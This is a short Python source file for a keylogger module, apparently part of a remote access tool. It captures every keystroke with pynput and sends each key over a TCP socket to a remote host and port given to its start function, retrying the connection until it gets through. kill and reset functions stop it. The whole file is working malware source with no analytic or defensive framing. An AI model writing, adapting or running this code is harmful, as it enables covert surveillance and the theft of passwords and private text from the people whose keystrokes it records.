import socket, os, subprocess, pathlib, platform, logging
from threading import Thread
from pynput.keyboard import Key, Listener


keylogRunning = False

killThread = False

def on_press(key):
	global kS
	global killThread
	global keylogRunning
	if killThread:
		reset()
		send = kS.send("kill".encode('utf8'))
		return False
	# if key == Key.esc:
	# 	return False
	send = kS.send(str(key).encode('utf8'))
	

def start(kPort, host):
	global kS
	global keylogRunning

	if keylogRunning:
		return
	else:
		print("Starting Keylogger")
	
	
	kNotConnected = True
	while kNotConnected:
		kS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			kS.connect((host,kPort))
			kNotConnected = False
			keylogRunning = True
		except:
			kNotConnected = True

	with Listener(on_press=on_press) as listener:
		listener.join()

def kill():
	global killThread
	killThread = True

def reset():
	global keylogRunning
	global killThread
	killThread = False
	keylogRunning = False

